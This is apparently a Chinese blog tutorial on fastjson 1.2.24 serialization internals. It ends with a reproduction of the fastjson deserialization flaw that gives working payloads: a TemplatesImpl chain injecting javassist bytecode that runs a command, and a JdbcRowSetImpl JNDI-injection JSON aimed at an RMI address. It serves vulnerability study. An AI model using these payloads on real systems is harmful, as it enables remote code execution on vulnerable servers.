    <content><![CDATA[<h2 id="什么是fastjson"><a href="#什么是fastjson" class="headerlink" title="什么是fastjson?"></a>什么是fastjson?</h2><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
<p>JavaBean是一个遵循特定写法的Java类，是一种Java语言编写的可重用组件，它的方法命名，构造及行为必须符合特定的约定：</p>
<p>1、这个类必须具有一个公共的(public)无参构造函数；<br>2、所有属性私有化（private）；<br>3、私有化的属性必须通过public类型的方法（getter和setter）<br>暴露给其他程序，并且方法的命名也必须遵循一定的命名规范。<br>4、这个类应是可序列化的。（比如可以实现Serializable 接口，用于实现bean的持久性）</p>
<p>但是尝试反序列化发现,其实是可以设置public的,如果有set再调用set,没有就直接改的它的值</p>
<h3 id="将类转为-json"><a href="#将类转为-json" class="headerlink" title="将类转为 json"></a>将类转为 json</h3><p>maven依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在这里我们最常用的方法就是 <code>JSON.toJSONString()</code> ，该方法有若干重载方法，带有不同的参数，其中常用的包括以下几个：</p>
<ul>
<li>序列化特性：<code>com.alibaba.fastjson.serializer.SerializerFeature</code>，可以通过设置多个特性到 <code>FastjsonConfig</code> 中全局使用，也可以在使用具体方法中指定特性。</li>
<li>序列化过滤器：<code>com.alibaba.fastjson.serializer.SerializeFilter</code>，这是一个接口，通过配置它的子接口或者实现类就可以以扩展编程的方式实现定制序列化。</li>
<li>序列化时的配置：<code>com.alibaba.fastjson.serializer.SerializeConfig</code> ，可以添加特点类型自定义的序列化配置。</li>
</ul>
<h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>首先定义一个user类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了getage&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span>+age+</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看看序列化会调用什么</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;baicany&quot;</span>,<span class="number">18</span>), SerializerFeature.WriteClassName));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">调用了getage</span><br><span class="line">调用了getName</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.example.User&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">19</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;baicany&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>参数里面多了一个<code>SerializerFeature.WriteClassName</code>方法。传入<code>SerializerFeature.WriteClassName</code>可以使得Fastjson支持自省，开启自省后序列化成<code>JSON</code>的数据就会多一个@type，这个是代表对象类型的<code>JSON</code>文本。FastJson的漏洞就是他的这一个功能去产生的，在对该JSON数据进行反序列化的时候，会去调用指定类中对于的get&#x2F;set&#x2F;is方法， 后面会详细分析。</p>
<p>发现序列化会用get方法来获取值,跟进序列化方法如何触发getter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toJSONString</span><span class="params">(Object object, <span class="type">int</span> defaultFeatures, SerializerFeature... features)</span> &#123;</span><br><span class="line">    <span class="type">SerializeWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializeWriter</span>((Writer) <span class="literal">null</span>, defaultFeatures, features);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JSONSerializer</span> <span class="variable">serializer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONSerializer</span>(out);</span><br><span class="line">        serializer.write(object);</span><br><span class="line">        <span class="keyword">return</span> out.toString();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JSONSerializer的构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JSONSerializer</span><span class="params">(SerializeWriter out, SerializeConfig config)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.out = out;</span><br><span class="line">    <span class="built_in">this</span>.config = config;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们在调用toJSONString调用的<code>SerializeConfig.globalInstance</code>赋值给config,而globalInstance按名字来看是全局SerializeConfig共有的一个对象,而在global实例化时候会创建一个map,存储我们一下默认的ObjectSerializer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">serializers = <span class="keyword">new</span> <span class="title class_">IdentityHashMap</span>&lt;Type, ObjectSerializer&gt;(<span class="number">1024</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">		    <span class="keyword">if</span> (asm) &#123;</span><br><span class="line">		        asmFactory = <span class="keyword">new</span> <span class="title class_">ASMSerializerFactory</span>();</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (NoClassDefFoundError eror) &#123;</span><br><span class="line">		    asm = <span class="literal">false</span>;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (ExceptionInInitializerError error) &#123;</span><br><span class="line">		    asm = <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		put(Boolean.class, BooleanCodec.instance);</span><br><span class="line">....</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<p>而我们自定义的类并不在这些put里面</p>
<p>继续跟进<code>serializer.write(object)</code>会尝试调用我们需要类的ObjectWriter,就是之前put存储的,但是都不存在,最后就会create我们类的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (create) &#123;</span><br><span class="line">                  put(clazz, createJavaBeanSerializer(clazz));</span><br><span class="line">              &#125;</span><br></pre></td></tr></table></figure>

<p>它会提取类当中的<code>BeanInfo</code>（包括有getter方法的属性）并传入<code>createJavaBeanSerializer</code>继续处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">private</span> <span class="keyword">final</span> ObjectSerializer <span class="title function_">createJavaBeanSerializer</span><span class="params">(Class&lt;?&gt; clazz)</span> &#123;</span><br><span class="line">    <span class="type">SerializeBeanInfo</span> <span class="variable">beanInfo</span> <span class="operator">=</span> TypeUtils.buildBeanInfo(clazz, <span class="literal">null</span>, propertyNamingStrategy);</span><br><span class="line">    <span class="keyword">if</span> (beanInfo.fields.length == <span class="number">0</span> &amp;&amp; Iterable.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">return</span> MiscCodec.instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> createJavaBeanSerializer(beanInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个方法也最终会将二次处理的beaninfo继续委托给createASMSerializer做处理，而这个方法其实就是通过ASM动态创建一个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">ObjectSerializer</span> <span class="variable">asmSerializer</span> <span class="operator">=</span> createASMSerializer(beanInfo);</span><br><span class="line">    <span class="keyword">if</span> (asmSerializer != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> asmSerializer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>getter方法的生成在<code>com.alibaba.fastjson.serializer.ASMSerializerFactory#generateWriteMethod</code>当中它会根据字段的类型调用不同的方法处理</p>
<p>然后再tostring方法中就会调用对应的get方法</p>
<h3 id="将-json-反序列化为类"><a href="#将-json-反序列化为类" class="headerlink" title="将 json 反序列化为类"></a>将 json 反序列化为类</h3><p>将 json 数据反序列化时常使用的方法为<code>parse()</code>、<code>parseObject()</code>、<code>parseArray()</code>，这三个方法也均包含若干重载方法，带有不同参数：</p>
<ul>
<li>反序列化特性：<code>com.alibaba.fastjson.parser.Feature</code>，</li>
<li>类的类型：<code>java.lang.reflect.Type</code>，用来执行反序列化类的类型。</li>
<li>处理泛型反序列化：<code>com.alibaba.fastjson.TypeReference</code>。</li>
<li>编程扩展定制反序列化：<code>com.alibaba.fastjson.parser.deserializer.ParseProcess</code>，例如<code>ExtraProcessor</code> 用于处理多余的字段，<code>ExtraTypeProvider</code> 用于处理多余字段时提供类型信息。</li>
</ul>
<p>一些 fastjson 功能要点</p>
<ul>
<li>使用 <code>JSON.parse(jsonString)</code> 和 <code>JSON.parseObject(jsonString, Target.class)</code>，两者调用链一致，前者会在 jsonString 中解析字符串获取 <code>@type</code> 指定的类，后者则会直接使用参数中的class。</li>
<li>fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter&#x2F;setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 <code>get</code> 开头且第4位是大写字母、方法不能有参数传入、继承自 <code>Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong</code>、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 <code>set</code> 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 <code>com.alibaba.fastjson.util.JavaBeanInfo.build()</code> 中。</li>
<li>使用 <code>JSON.parseObject(jsonString)</code> 将会返回 JSONObject 对象，且类中的所有 getter 与setter 都被调用。</li>
<li>如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 <code>Feature.SupportNonPublicField</code> 参数。</li>
<li>fastjson 在为类属性寻找 get&#x2F;set 方法时，调用函数 <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> 方法，会忽略 <code>_|-</code> 字符串，也就是说哪怕你的字段名叫 <code>_a_g_e_</code>，getter 方法为 <code>getAge()</code>，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 <code>_</code> 和 <code>-</code> 进行组合混淆。</li>
<li>fastjson 在反序列化时，如果 Field 类型为 <code>byte[]</code>，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。</li>
</ul>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.User\&quot;,\&quot;age\&quot;: 19,\&quot;name\&quot;:\&quot;baicany\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">json2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;age\&quot;:3,\&quot;name\&quot;:\&quot;baicany\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(JSON.parseObject(json));</span><br><span class="line">        System.out.println(JSON.parseObject(json,User.class));</span><br><span class="line">        System.out.println(JSON.parseObject(json2, User.class));</span><br><span class="line">        System.out.println(JSON.parseObject(json2));</span><br><span class="line">        System.out.println(JSON.parse(json2));</span><br><span class="line">        System.out.println(JSON.parse(json));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在使用<code>JSON.parseObject</code>方法的时候只有在第二个参数指定是哪个类 才会反序列化成功。在字符串中使用<code>@type:com.liang.pojo.User</code>指定类 会调用此类的get和set方法 但是会转化为<code>JSONObject</code>对象。<br>而使用<code>JSON.parse</code>方法 无法在第二个参数中指定某个反序列化的类，它识别的是<code>@type</code>后指定的类<br>而且可以看到 凡是反序列化成功的都调用了set方法,但是只有parseObject(str)调用了返回值为string,get方法,因为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (JSONObject) JSON.toJSON(obj);</span><br></pre></td></tr></table></figure>

<h3 id="fastjson反序列化漏洞复现"><a href="#fastjson反序列化漏洞复现" class="headerlink" title="fastjson反序列化漏洞复现"></a>fastjson反序列化漏洞复现</h3><h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h4><p>跟进我们老朋友的getOutputProperties方法,发现会调用<code>newTransformer</code>方法,跟进发现会实例化TransformerImpl类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">           _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure>

<p>跟进<code>getTransletInstance</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">           <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">           <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">           <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">                   _class[_transletIndex].getConstructor().newInstance();</span><br><span class="line">           translet.postInitialization();</span><br><span class="line">           translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">           translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">           translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">           <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">               translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> translet;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>如果我们name为null,而_class为null的话就会触发defineTransletClasses方法,这里想起defineclass</p>
<p>提下之前学过的</p>
<p>之前学过加载字节码,Java都经历的是下面这三个方法调用</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">ClassLoader#loadClass ---&gt; ClassLoader#findClass ---&gt; ClassLoader#defineClass</span><br></pre></td></tr></table></figure>

<p>loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass<br>findClass 的作用是根据基础URL指定的方式来加载类的字节码，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass<br>defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类<br>所以真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java默认的 ClassLoader#defineClass 是一个native方法，逻辑在JVM的C语言代码中</p>
<p>跟进这个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>

<p>当我们code不为null的时候,才能调用我们的TransletClassLoader构造方法跟进这个方法,(_tfactory这里不能为null了不然就会报错)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">     <span class="built_in">super</span>(parent);</span><br><span class="line">    _loadedExternalExtensionFunctions = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现调用了super,发现这个类是classload的子类,并且从写了loadclass方法并且为默认属性,且这里没有显式地声明其定义域。Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为<code>default</code>。所以也就是说这里的<code>defineClass</code> 由其父类的<code>protected</code>类型变成了一个<code>default</code>类型的方法，可以被类外部调用。这样我们就能外部调用这个方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">_class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line"><span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if this is the main class</span></span><br><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现判断我们byte字节码里面的类是不是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有是它子类的字节码就会扔出错误,所以需要不扔出错误,就父类得刷它,继续跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">        _class[_transletIndex].getConstructor().newInstance();</span><br></pre></td></tr></table></figure>

<p>发现会调用默认的参数方法并且实例化</p>
<p>所以到这里的条件应该是name不为null,class为null,而byte字节码有它该有的父类,_tfactory不为null</p>
<p>所以我们要创建一个这样的类调用它的getOutputProperties方法</p>
<p>而我们的这4个字段都是私有的,且都没有set方法,所以设置Feature.SupportNonPublicField,让它能赋值,所以payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        cc.makeClassInitializer().insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] classbyte = cc.toBytecode();</span><br><span class="line">        String code=Base64.getEncoder().encodeToString(classbyte);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot; \&quot;_bytecodes\&quot;: [\&quot;&quot;</span>+code+<span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_name\&quot;: \&quot;baicany\&quot;,&quot;</span>+</span><br><span class="line">                <span class="string">&quot; \&quot;_tfactory\&quot;: &#123;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_outputProperties\&quot;: &#123;&#125;,&quot;</span>+</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(json, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h4><p>JdbcRowSetImpl 类位于 <code>com.sun.rowset.JdbcRowSetImpl</code>是 <code>javax.naming.InitialContext#lookup()</code> 参数可控导致的 JNDI 注入。</p>
<p>搜索一下哪里调用了lookup方法,发现在这个类里面只有connect方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure>

<p>这里要调用lookup,里面的值是DataSourceName,并且conn为null</p>
<p>来看看datasource有对应的set方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataSourceName</span><span class="params">(String var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br></pre></td></tr></table></figure>

<p>可以控制它的值,现在就看那能调用了connect方法,并且是set,get方面里面触发 发现2个</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> DatabaseMetaData <span class="title function_">getDatabaseMetaData</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="built_in">this</span>.connect();</span><br><span class="line">    <span class="keyword">return</span> var1.getMetaData();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是getDatabaseMetaData返回值并不是那5个之一所以,payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:9999/baicany\&quot;,\n&quot;</span> +</span><br><span class="line">        <span class="string">&quot;    \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">JSON.parse(json);</span><br></pre></td></tr></table></figure>

<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>跟进parse方法</p>
